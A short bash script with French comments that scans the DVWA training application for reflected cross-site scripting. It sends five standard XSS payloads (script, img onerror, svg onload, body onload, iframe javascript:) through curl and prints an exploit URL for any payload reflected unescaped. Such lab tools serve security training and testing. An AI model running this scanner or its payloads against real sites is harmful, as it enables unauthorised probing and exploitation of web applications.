#!/bin/bash
# Script XSS simplifié avec curl

TARGET_URL="$1"
PAYLOAD_TYPE="${3:-mixed}"

if [ -z "$TARGET_URL" ]; then
  echo "Usage: ./xss_attack_simple.sh <target_url>"
  exit 1
fi

echo "[*] XSS Attack - Testing DVWA XSS (Reflected)"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload type: $PAYLOAD_TYPE"
echo ""

# DVWA XSS Reflected page
BASE_URL="${TARGET_URL}/vulnerabilities/xss_r/"

# Payloads XSS à tester
declare -a PAYLOADS=(
  "<script>alert('XSS')</script>"
  "<img src=x onerror=alert('XSS')>"
  "<svg/onload=alert('XSS')>"
  "<body onload=alert('XSS')>"
  "<iframe src='javascript:alert(\"XSS\")'>"
)

echo "[+] Testing XSS payloads..."
echo "================================"
echo ""

for i in "${!PAYLOADS[@]}"; do
  PAYLOAD="${PAYLOADS[$i]}"
  ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | sed 's/ /%20/g' | sed 's/</%3C/g' | sed 's/>/%3E/g' | sed 's/"/%22/g' | sed "s/'/%27/g")

  echo "[$((i+1))/${#PAYLOADS[@]}] Testing payload: $PAYLOAD"

  # Tester le payload
  RESPONSE=$(curl -s "${BASE_URL}?name=${ENCODED_PAYLOAD}" -H "Cookie: security=low; PHPSESSID=test")

  # Vérifier si le payload est reflété sans échappement
  if echo "$RESPONSE" | grep -q "$PAYLOAD"; then
    echo "    ✅ VULNERABLE! Payload reflected without escaping"
    echo "    🎯 Exploit URL: ${BASE_URL}?name=${ENCODED_PAYLOAD}"
  else
    echo "    ❌ Payload blocked or escaped"
  fi

  echo ""
  sleep 1
done

echo "================================"
echo "[+] XSS scan completed"
echo "[+] Summary: Tested ${#PAYLOADS[@]} payloads"
